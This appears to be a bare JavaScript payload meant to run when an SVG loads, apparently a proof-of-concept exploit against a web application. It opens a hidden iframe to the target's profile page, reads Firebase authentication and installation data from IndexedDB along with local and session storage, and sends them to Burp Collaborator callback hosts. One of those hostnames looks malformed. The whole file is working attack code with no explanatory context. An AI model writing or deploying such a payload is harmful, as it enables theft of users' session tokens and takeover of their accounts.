svg.script:

// This runs when the SVG is loaded
(function() {
  var iframe = document.createElement('iframe');
  iframe.src = 'https://ai.redacted.com/profile';
  iframe.style.display = 'none';
  document.body.appendChild(iframe);

  iframe.onload = function() {
    var win = iframe.contentWindow;

    // Access IndexedDB
    var request = win.indexedDB.open('firebase-installations-database');
    request.onsuccess = function(event) {
      var db = event.target.result;
      var transaction = db.transaction(['firebase-installations-store'], 'readonly');
      var store = transaction.objectStore('firebase-installations-store');
      var getAll = store.getAll();
      getAll.onsuccess = function() {
        var firebaseData = getAll.result;
        fetch('https://5ciu66isju6ptil8gcjreweppgv7jyim7.oastify.com/firebase', {
          method: 'POST',
          body: JSON.stringify({
            firebaseInstallations: firebaseData,
            localStorage: JSON.stringify(win.localStorage),
            sessionStorage: JSON.stringify(win.sessionStorage)
          })
        });
      };
    };

    var firebaseDBs = [
      'firebase-local-storage',
      'firebase-auth-database',
      'firebase::firebase:ai.planet.com',
      'persistence:ai.planet.com'
    ];

    firebaseDBs.forEach(function(dbName) {
      try {
        var req = win.indexedDB.open(dbName);
        req.onsuccess = function(e) {
          fetch('https://x1zmvy7k8mvhiaa0548j3o3he8kz8qaez.oastify.com.oastify.com/db?name=' + dbName);
        };
      } catch(e) {}
    });
  };
})();
